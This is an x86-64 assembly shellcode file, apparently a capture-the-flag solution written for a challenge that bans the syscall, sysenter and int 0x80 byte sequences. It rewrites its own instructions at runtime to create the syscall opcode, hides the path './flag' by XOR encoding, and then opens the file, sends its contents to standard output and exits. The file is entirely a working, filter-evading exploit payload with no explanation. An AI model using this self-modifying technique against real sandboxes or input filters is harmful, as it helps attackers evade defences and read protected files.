# 禁用
# 0x0f05 syscall
# 0f34 sysenter
# 80cd int

.global _start
_start:
.intel_syntax noprefix
        lea r8, [rip+call1]
        mov r9w, 0x0101
        mov word ptr [r8], 0x40e  # 大小端
        xor word ptr [r8], r9w
        lea r8, [rip+call2]
        mov word ptr [r8], 0x40e
        xor word ptr [r8], r9w
        lea r8, [rip+call3]
        mov word ptr [r8], 0x40e
        xor word ptr [r8], r9w
        xor r8, r8
        xor r9, r9
        xor al, al
        mov al, 2
        mov rdi, 0x010166606d672e2f
        mov r8, 0x0101010101010101
        xor rdi, r8
        push rdi
        mov rdi, rsp
        xor esi, esi
        xor edx, edx
call1:
        xor edx, edx  # syscall
        nop
        nop
        mov esi, eax
        mov al, 40
        xor edi, edi
        inc edi
        mov r10w, 0x3e8
call2:
        xor edx, edx  # syscall
        nop
        nop
        mov al, 60
        xor edi, edi
call3:
        xor edx, edx
        nop
        nop
